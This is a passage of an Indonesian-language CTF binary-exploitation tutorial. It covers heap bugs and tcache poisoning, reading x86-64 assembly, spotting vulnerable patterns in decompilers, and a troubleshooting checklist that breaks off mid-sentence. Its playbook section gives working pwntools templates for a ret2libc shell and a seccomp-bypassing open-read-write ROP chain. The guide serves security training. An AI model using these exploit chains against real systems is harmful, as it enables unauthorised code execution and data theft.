| **Use-After-Free (UAF)** | **Analogi:** Anda meminjam loker, mengembalikan kuncinya, tapi Anda diam-diam membuat duplikat kuncinya. Loker tersebut lalu disewakan ke orang lain, tapi Anda masih membuka loker itu malam hari dan mengganti isi dokumen penyewa baru.<br>**Teknis:** Pointer memori masih menyimpan alamat yang telah di-`free()` dan program tetap menggunakannya. | Sangat mematikan. Bisa digunakan untuk membocorkan memori (Read) atau menimpa metadata penting dari objek administratif baru (Write). |
| **Double Free** | **Analogi:** Anda menipu kasir dengan memberikan kartu pendaftaran barang pengembalian dua kali pada satu barang yang sama. Daftar inventaris kasir kacau balau.<br>**Teknis:** Pemanggilan fungsi `free(ptr)` dua kali pada alamat yang sama. | Dapat menyebabkan dua alokasi `malloc()` baru menunjuk ke lokasi memori yang sama persis (*Chunk Overlapping*). |
| **Heap Overflow** | Mengisi data melampaui batas alokasi `malloc`, menumpahkan data ke Chunk tetangga. Berbeda dengan Stack yang menimpa alamat return, Heap Overflow menimpa **Metadata** (seperti header "Ukuran") pada chunk di sebelahnya. | Menipu sistem manajer memori (Glibc) sehingga ia menganggap ukuran blok memori lebih besar/kecil dari seharusnya. |

### 6.3 Tcache Poisoning: Meracuni Daftar Tunggu (Glibc Modern)

Ini adalah teknik modern eksploitasi UAF/Double Free yang sering muncul di tantangan CTF era saat ini.

Setiap blok kosong di Tcache menggunakan blok kosong pertama dari dirinya sendiri (*User Data area*) untuk menyimpan **pointer yang menunjuk ke blok kosong berikutnya** (dikenal sebagai `fd` atau forward pointer). Tujuannya agar manajer bisa menarik blok seperti rantai.

**Alur Eksekusi (Tcache Poisoning):**
1. Program rentan terhadap UAF. Kita mengalokasikan Chunk A, lalu melepaskannya (free). Chunk A masuk ke daftar "Barang Tersedia" (Tcache bin).
2. Menggunakan celah *UAF Write*, kita tetap menulisi memori Chunk A meskipun ia sudah berstatus *free*.
3. Kita menulis **alamat tujuan jahat** (misalnya alamat target `__free_hook`) menimpa pointer `fd` asli milik Chunk A.
4. Tcache bin kini tertipu. Ia mencatat: "Barang tersedia pertama adalah Chunk A. Dan berdasarkan petunjuk dari Chunk A, barang tersedia kedua berada di `__free_hook`".
5. Kita memanggil `malloc()` pertama. Sistem memberikan Chunk A kepada kita. (Sistem tidak masalah).
6. Kita memanggil `malloc()` kedua. Sistem mengambil alamat dari catatan daftar tunggu, lalu memberikan kita izin legal untuk menulisi memori di alamat `__free_hook`.
7. Boom! Arbitrary Write berhasil. Kita menimpa `__free_hook` dengan `system()`.

> ⚠️ **Catatan Glibc 2.32+ (Safe Linking)**
> Karena Tcache poisoning terlalu mudah, sejak 2020 developer Glibc memperkenalkan *Safe-Linking*. Pointer `fd` tidak lagi disimpan secara mentah, melainkan "diacak" (di-XOR-kan) dengan sisa dari pergeseran memori alamat Heap-nya sendiri (Bitwise Right Shift 12). Untuk menyerang sistem modern, peretas **wajib** mendapatkan *Heap Leak* (kebocoran alamat basis heap) terlebih dahulu agar dapat melakukan enkripsi XOR secara matematis terhadap alamat palsu (payload) mereka sebelum menyuntikkannya.

---

## Bab 7: Intip Balik Tirai (Reverse Engineering & Assembly Dasar)

Bagaimana jika tantangannya tidak memberikan *source code* (file ekstensi .c)? Anda wajib menggunakan Disassembler dan Decompiler (seperti **Ghidra** atau **IDA Pro**). Kedua alat ini akan menerjemahkan kode biner menjadi kode mesin (Assembly) dan juga merekonstruksinya menjadi struktur mirip bahasa C (Pseudo-code).

### 7.1 Panduan Bertahan Hidup Membaca Assembly (x86-64)

Instruksi Assembly memiliki sintaks yang ringkas: `Perintah [Tujuan], [Sumber]` (Format Intel).

* `mov rax, rbx` : Pindahkan (salin) nilai yang ada di laci RBX ke laci RAX.
* `mov rax, [rbx]` : (Perhatikan kurung siku!). Baca alamat memori yang tertulis di dalam laci RBX, pergi ke alamat itu, ambil datanya, dan simpan ke laci RAX. Sama persis dengan *pointer dereferencing* (`*ptr`) di bahasa C.
* `lea rax, [rbp-0x20]` : (Load Effective Address). Hitung saja rumusnya (misalnya, alamat RBP dikurangi angka heksa 0x20), dan letakkan **hasil perhitungan alamatnya** ke dalam laci RAX. Sangat sering digunakan untuk menyiapkan posisi buffer memori sebelum memanggil fungsi seperti `read()`.
* `push rax` / `pop rdi` : Meletakkan data RAX ke atas tumpukan stack / Mengambil kepingan paling atas dari stack dan menjejalkannya ke dalam laci RDI.
* `cmp rax, 0x5` lalu diikuti `je 0x401120` : Bandingkan isi RAX dengan angka 5. Jika sama (*Jump if Equal*), lompat ke alamat memori tertentu (ini adalah akar dari statement kondisi `if(x == 5)`).

### 7.2 Trik Cepat Mengidentifikasi Kerentanan via Ghidra/IDA

Saat Anda memutar sebuah *binary* di decompiler, pola matanya harus langsung tertuju pada indikasi kelemahan spesifik:

| Pola Pseudo-code / Assembly | Artinya | Serangan Potensial |
| :--- | :--- | :--- |
| `gets(local_20)` atau <br>`scanf("%s", buffer)` | Program membaca rentetan karakter tanpa memeriksa batasan sama sekali hingga baris baru ditemukan. | **Buffer Overflow (Stack).** Pintu masuk utama untuk Ret2Win, ROP, dsb. |
| `printf(local_18)` (Dimana argumennya hanya satu, tanpa "%s") | Fungsi cetak dipanggil dengan variabel yang isinya dikontrol secara penuh oleh pengguna. | **Format String Vulnerability.** (Eksploitasi `%p` dan `%n`). |
| `free(ptr);` (Namun setelah baris ini tidak ada penulisan `ptr = NULL;`) | Variabel petunjuk memori masih menyimpan alamat yang sudah "bebas tugaskan" / dikembalikan. | **Use-After-Free (UAF) di Heap.** |
| `read(0, local_10, 0x100)` (Sedangkan local_10 ukurannya hanya 32 byte) | Program membatasi pembacaan memori. Tetapi *batas logika ukuran 0x100* lebih besar daripada daya tampung fisiknya. | **Buffer Overflow / Overwrite.** |

---

## Bab 8: Playbook & Template Eksploitasi (Salin-Tempel)

Bagian ini didedikasikan untuk *cheatsheet* komprehensif penulisan skrip eksploitasi berbasis `pwntools`. Ingat, struktur dasarnya selalu diawali dengan *skeleton* yang telah kita bahas di Bab 3.

### 8.1 Ret2Libc Lengkap (Pypass NX & ASLR)

Skenario: Anda memiliki kelemahan Buffer Overflow. Proteksi NX aktif (tidak bisa eksekusi shellcode di stack). Tidak ada fungsi `win` khusus. Anda harus membocorkan tabel GOT untuk meretas ASLR lalu memanggil `system("/bin/sh")`.

```python
# (Asumsi boilerplate pwntools sudah ada)
# offset = jarak crash buffer.
offset = 40 

# Tahap Pencarian Gadget
rop = ROP(exe)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0] # Penting untuk alignment x64

# ================================
# STAGE 1: LEAK (Bocorkan Libc)
# ================================
# Payload: [PADDING] + [RET Alignment] + [POP RDI] + [Arg: Alamat GOT Puts] + [Call Puts@PLT] + [Kembali ke main]

payload_leak  = b'A' * offset
payload_leak += p64(RET) 
payload_leak += p64(POP_RDI)
payload_leak += p64(exe.got['puts'])     # Parameter 1 untuk Puts: Alamat GOT dari Puts
payload_leak += p64(exe.plt['puts'])     # Panggil fungsi Puts
payload_leak += p64(exe.symbols['main']) # Program jangan mati, ulangi dari main!

io.sendline(payload_leak)

# ================================
# STAGE 2: PARSING MEMORY LEAK
# ================================
# Fungsi puts akan memuntahkan memori, kita bersihkan baris baru dan sesuaikan dengan format 64 bit
bocoran_raw = io.recvline().strip()
bocoran_clean = bocoran_raw.ljust(8, b'\x00') 
alamat_puts_asli = u64(bocoran_clean)

log.success(f"Bocoran Puts libc : {hex(alamat_puts_asli)}")

# Hitung Basis Libc dengan mengurangkan alamat hasil leak dengan letak aslinya di file libc
libc.address = alamat_puts_asli - libc.symbols['puts']
log.success(f"Alamat Dasar Libc (Base): {hex(libc.address)}")

# ================================
# STAGE 3: TEMBAKAN AKHIR (SHELL)
# ================================
# Kini kita memiliki alamat basis libc yang nyata di sesi running ini.
# Cari lokasi string "/bin/sh" dan lokasi fungsi "system"
BINSH = next(libc.search(b'/bin/sh\x00'))
SYSTEM = libc.symbols['system']

payload_shell  = b'A' * offset
payload_shell += p64(RET)       # Sekali lagi, penjaga keselarasan tumpukan stack (Stack Alignment 16-byte)
payload_shell += p64(POP_RDI)
payload_shell += p64(BINSH)     # Parameter 1 = Teks "/bin/sh"
payload_shell += p64(SYSTEM)    # Panggil fungsi system

# Kirimkan saat loop program kembali berputar
io.sendline(payload_shell)
io.interactive()
```

### 8.2 Seccomp Bypass via ORW (Open-Read-Write)

Skenario: Eksploit Anda sempurna. `system("/bin/sh")` telah dieksekusi. Tapi program tidak memberikan terminal, ia mati misterius. Kemungkinan sistem dilindungi **Seccomp (Secure Computing Mode)** yang membanned/memblokir secara kernel pemanggilan `execve` (pondasi `system`). Jika ini terjadi, kita beralih memanggil Syscall level rendah untuk langsung membaca dan memprint bendera (flag.txt).

```python
# [Asumsi Stage 1 Leak Libc sudah dilakukan dan libc.address telah diketahui]

# Kita tidak lagi menggunakan system(), tapi merakit ROP chain untuk Syscall.
# ORW: Membuka file (Open), Membaca file (Read), Mencetak isinya (Write).
# Catatan: Kita butuh string "flag.txt" ditaruh di suatu memori terukur (contoh: segmen bss)

# Temukan Gadget
rop_libc = ROP(libc)
POP_RAX = rop_libc.find_gadget(['pop rax', 'ret'])[0]
POP_RDI = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop_libc.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop_libc.find_gadget(['pop rdx', 'ret'])[0]
SYSCALL = rop_libc.find_gadget(['syscall', 'ret'])[0]

ALAMAT_FLAG = exe.bss() + 0x100 # Lokasi untuk teks "flag.txt" (Anggap kita sudah menyuntiknya)
ALAMAT_BUFFER = exe.bss() + 0x200 # Ruang lapang kosong untuk membaca isinya

# ===================
# 1. Syscall OPEN
# ===================
# rax = 2 (syscall open)
# rdi = *filename, rsi = 0 (Read only)
payload_orw  = b'A' * offset
payload_orw += p64(POP_RAX) + p64(2) 
payload_orw += p64(POP_RDI) + p64(ALAMAT_FLAG)
payload_orw += p64(POP_RSI) + p64(0)
payload_orw += p64(SYSCALL)

# ===================
# 2. Syscall READ
# ===================
# Hasil Open berupa angka identitas (File Descriptor) akan turun di RAX (biasanya bernilai 3).
# rax = 0 (syscall read)
# rdi = 3 (fd dari file flag), rsi = *buffer, rdx = panjang_baca
payload_orw += p64(POP_RDI) + p64(3) 
payload_orw += p64(POP_RSI) + p64(ALAMAT_BUFFER)
payload_orw += p64(POP_RDX) + p64(0x100) # Ukuran baca flag
payload_orw += p64(POP_RAX) + p64(0)
payload_orw += p64(SYSCALL)

# ===================
# 3. Syscall WRITE
# ===================
# rax = 1 (syscall write)
# rdi = 1 (Standard Output/Monitor), rsi = *buffer, rdx = panjang
payload_orw += p64(POP_RDI) + p64(1)
payload_orw += p64(POP_RSI) + p64(ALAMAT_BUFFER)
payload_orw += p64(POP_RDX) + p64(0x100)
payload_orw += p64(POP_RAX) + p64(1)
payload_orw += p64(SYSCALL)

io.sendline(payload_orw)
# Bendera akan langsung tercetak ke layar!
```

---

## Bab 9: Simpulan dan Checklist Penyelamatan Diri

### 9.1 Matrix Pemecahan Masalah (Troubleshooting)

Jika eksploitasi Anda gagal dan Anda merasa terjebak (*Stuck*), tanyakan daftar periksa (checklist) di bawah ini sebelum menyerah:

* **Eksploit jalan di komputer lokal, tapi ditolak server remote?** 90% masalahnya adalah ketidaksesuaian versi file `libc.so.6` (Library Parity). Server menggunakan versi glibc yang berbeda dengan Kali Linux Anda, sehingga alamat *offset* (jarak internal fungsi system) yang Anda hitung menjadi berantakan. Gunakan `patchelf` untuk menempelkan libc panitia ke biner uji lokal Anda.
* **Program melempar peringatan SIGSEGV di instruksi `movaps` di dalam `system()`?** Anda melupakan Stack Alignment 16-byte. Sisipkan satu perintah `ret` kosong di awal ROP Chain.
* **Mendapatkan shell (Anda bisa mengetik), tapi tertutup saat itu juga (EOF)?** Layanan (service) server mungkin memutus atau mereset koneksi Standard Input/Output. Atau Seccomp melindungi kernel. Beralihlah ke serangan *ORW (Open-Read-Write)* yang tidak memerlukan terminal interaktif.
* **Alamat leak (bocoran) yang saya terima terlihat sangat aneh?** Periksa kembali *endianness* (gunakan fungsi `u64()`). Pastikan fungsi pencetak Anda (`puts` atau `printf`) tidak terpotong oleh karakter *null-byte* (`
